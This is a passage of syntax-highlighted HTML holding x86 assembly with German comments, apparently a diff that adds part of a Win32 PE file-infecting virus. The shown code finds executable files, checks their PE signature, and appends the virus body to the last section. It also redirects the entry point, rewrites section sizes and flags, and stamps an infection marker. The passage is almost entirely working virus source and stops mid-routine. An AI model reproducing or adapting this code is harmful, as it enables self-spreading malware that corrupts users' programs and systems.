+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> CreateMap &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Neu Mappen</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Beenden falls es Fehler gab</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jc</span> NoEXE<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; esi soll wieder auf den PE-Header zeigen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3Ch</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wieder in einen absoluten Wert umrechenen</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; edi = esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; eax = Anzahl der Sektionen</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wir ermitteln nun die letzte Sektion, damit wir</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; dort unseren Code anhängen können</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">movzx</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">06h</span><span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">dec</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">imul</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">28h</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; mit 28 ( der Größe der Sektion-Header ) multiplizieren,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; damit wir den letzten Sektion Header ermitteln</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; in absolute Adresse umrechnen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">78h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Auf die Directory Table zeigen lassen</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">74h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Anzahl der Directory Entrys ermitteln</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">shl</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; mit 8 multiplizieren</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; damit esi auf den letzten Eintrag zeigt</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Entry Point ermitteln und speichern, damit</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wir in der Lage sind zur Originaldatei zurückzuspringen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">28h</span><span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>OldEIP<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Imagebase ermitteln und speichern</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">34h</span><span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>OldBase<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Größe der RAW-Data ermitteln</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; die wir später vergrößern</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">14h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; edx = Zeiger auf raw-data</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; auf dem Stack speichern</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0Ch</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; in absolute Adresse umrechnen</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; damit haben wir unsere neue EIP ( Ende der alten RAW-Data )</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">28h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>NewEIP<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Raw-Data Größe erhöhen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> VirusSize<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3Ch</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; und runden</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">Align</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; in der Datei als neue Größe speichern</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; neue Virual-Size berechnen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> VirusSize<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> Buffersize<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">08h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0Ch</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Neue Imagesize berechnen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">50h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Sektion flags ändern, damit wir Lese &amp; Schreibzugriff</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; haben wenn die Datei ausgeführt wird</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Natürlich setzen wir auch das Code Flag.. ;)</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">or</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">24h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0A0000020h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir schreiben nun noch unsere Infektionsmarke in die</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Datei, damit wir sie nicht doppelt infizieren</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; --&gt; Test</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4Ch</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'tseT'</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xchg</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>Virus<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Nun hängen wir zuguterletzt unseren Virus an</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MapAddress<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> VirusSize<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Größe in ECX, Start in esi, Datei in edi</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">rep</span> <span style="color: #00007f; font-weight: bold;">movsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Virus anhängen</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">dec</span> <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>InfCounter<span style="color: black;">&#93;</span><br/>
+<br/>
+NoEXE<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Nun beenden wir die Prozedur, und schreiben</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; dann die Datei auf die Platte ( unmappen )</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">stc</span><br/>
+<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; --------------------------[ Align-Prozedur ]-------------------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Größe runden..</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; eax - Größe</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; ecx - Rundungsbasis</span><br/>
+<span style="color: #0000ff; font-weight: bold;">Align</span><span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">div</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">sub</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; eax - Neue Größe</span><br/>
+<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; --------------------------[ FindFile Prozeduren ]--------------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Diese Prozeduren suchen nach Dateien</span><br/>
+<br/>
+FindFirstFileProc<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>WIN32_FIND_DATA<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XFindFirstFileA<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>FindHandle<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+FindNextFileProc<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>WFD_szFileName<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> 276d &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wir löschen die Felder, damit wir nicht noch Überreste</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; einer alten Suche drinnen haben</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">rep</span> <span style="color: #00007f; font-weight: bold;">stosb</span><br/>
+&nbsp;<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>WIN32_FIND_DATA<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>FindHandle<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XFindNextFileA<span style="color: black;">&#93;</span><br/>
+<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+<br/>
+<span style="color: black; font-style: italic;">;****************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; ---------------------[ PE / MZ Marken überprüfen ]-------------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Hier testen wir die PE und MZ Marken, damit </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wir die EXE-Dateien identifizieren können</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Diesmal bisserl anders als normal ;)</span><br/>
+CheckPESign<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'FP'</span> <span style="color: black; font-style: italic;">; größer oder gleich &quot;PF&quot;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jae</span> NoPESign<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'DP'</span> <span style="color: black; font-style: italic;">; kleiner oder gleich &quot;PD&quot;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jbe</span> NoPESign<br/>
+&nbsp;<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">clc</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Alles was überbleibt ist &quot;PE&quot;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+&nbsp;<br/>
+NoPESign<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">stc</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+CheckMZSign<span style="color: #339933;">:</span><br/>
+<br/>
